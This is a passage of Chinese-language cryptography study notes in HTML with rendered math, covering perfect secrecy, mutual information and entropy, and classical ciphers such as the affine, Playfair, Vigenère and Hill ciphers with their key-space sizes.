style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></span></li></ul><h3 id="完善密码系统"><a class="markdownIt-Anchor" href="#完善密码系统"></a> 完善密码系统</h3><p>P(明文/密文) = P(明文 * 密文)/ P(密文) = p(明文)</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>c</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>P</mi><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo>∗</mo><msub><mi>c</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>P</mi><mo stretchy="false">(</mo><msub><mi>c</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>P</mi><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(p_i/c_i) = P(p_i * c_i) / P(c_i) = P(p_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401022352342.png" alt="image-20240102235137112" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401030003528.png" alt="image-20240103000326443" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401030003640.png" alt="image-20240103000334588" /></p><h3 id="完全保密性"><a class="markdownIt-Anchor" href="#完全保密性"></a> 完全保密性</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401030006768.png" alt="image-20240103000654687" /></p><h3 id="互信息"><a class="markdownIt-Anchor" href="#互信息"></a> 互信息</h3><ul><li>互信息**I(X,Y)<strong>为联合分布</strong>p(x,y)<strong>和乘积分布</strong>p(x)p(y)**的相对熵</li></ul><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mi>log</mi><mo>⁡</mo><mfrac><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">I(X,Y)=\sum_{x\in X}\sum_{y\in Y}p(x,y)\log\frac{p(x,y)}{p(x)p(y)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.857444em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li>熵与互信息的关系</li></ul><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">/</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">/</mi><mi>X</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>+</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}I(X,Y)&amp;=H(X)-H(X/Y)=H(Y)-H(Y/X)\\&amp;=H(X)+H(Y)-H(XY)\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000000000000004em;vertical-align:-1.2500000000000002em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7500000000000002em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2500000000000002em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7500000000000002em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2500000000000002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312301833774.png" alt="image-20231230183333590" /></p><h1 id="第3章-古典密码体制"><a class="markdownIt-Anchor" href="#第3章-古典密码体制"></a> 第3章 古典密码体制</h1><h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2><ul><li>替换密码/代换密码 --&gt; 用一个符号代替另一个符号<ul><li>单表替换<ul><li>移位代换密码(经典凯撒密码)</li><li>乘数密码 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><mi>i</mi><mo>∗</mo><mi>k</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E=i*k(mod \  q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>，要求(k,q)=1，即可用密钥少于q<ul><li>密钥空间<ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\varphi(q) - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>个密钥，因为这里需要找到与q互素的数字，同时减去1，因为它会使得明文密文相同</li></ul></li></ul></li><li>仿射密码(移位密码和乘数密码的组合)<ul><li>n=26时的可能密钥数为<strong>12*26-1</strong>(乘数密钥空间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mn>26</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(26)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span></span></span></span>与移位密钥空间26相乘，然后减去其中明文与密文一样的情况)</li></ul></li></ul></li><li>多表替换<ul><li>一次一密(Vernam)</li><li>Playfair密码(密钥空间 <strong>25!</strong>)</li><li>维吉尼亚密码(key长度为m，密钥空间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><msup><mn>6</mn><mi>m</mi></msup></mrow><annotation encoding="application/x-tex">26^m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span></span></span>)</li><li>Hill密码(key=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>n</mi><mo>⋅</mo><mi>n</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[n \cdot n]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">]</span></span></span></span>，空间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><msup><mn>6</mn><mrow><mi>n</mi><mo>⋅</mo><mi>n</mi></mrow></msup></mrow><annotation encoding="application/x-tex">26^{n \cdot n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.674115em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.674115em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">⋅</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span>)<ul><li>这里需要求逆矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mo stretchy="false">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd></mtr></mtable><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k=(\begin{matrix}1&amp;8\\3&amp;7\end{matrix})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.4000000000000004em;vertical-align:-0.9500000000000004em;"></span><span class="mopen">(</span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li>2x2的伴随矩阵求法<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>d</mi><mi>j</mi><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>d</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>d</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>b</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>c</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">adj\begin{pmatrix}a&amp;b\\c&amp;d\end{pmatrix}=\begin{pmatrix}d&amp;-b\\-c&amp;a\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal">b</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></li><li><a 